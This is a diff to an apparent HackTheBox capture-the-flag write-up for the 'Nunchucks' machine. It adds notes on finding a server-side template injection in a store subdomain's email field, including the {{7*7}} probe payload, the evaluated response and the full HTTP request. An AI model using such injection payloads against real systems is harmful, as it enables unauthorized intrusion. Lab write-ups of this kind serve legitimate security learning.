@@ -72,3 +72,33 @@ ________________________________________________
 store                   [Status: 200, Size: 4029, Words: 1053, Lines: 102]
 ```
 Found a sub domain at store.nunchucks.htb
+
+Web server has ssti vulnverability in "email" parameter
+```
+Requests
+
+{"email":"{{7*7}}@htb.org"}
+
+Response
+
+{"response":"You will receive updates on the following email address: 49@htb.org."}
+```
+Request Header
+```
+POST /api/submit HTTP/1.1
+Host: store.nunchucks.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://store.nunchucks.htb/
+Content-Type: application/json
+Origin: https://store.nunchucks.htb
+Content-Length: 27
+DNT: 1
+Connection: keep-alive
+Cookie: _csrf=Tq_qR2QxRfBNVi5JncWUOntN
+Sec-GPC: 1
+```
+
+
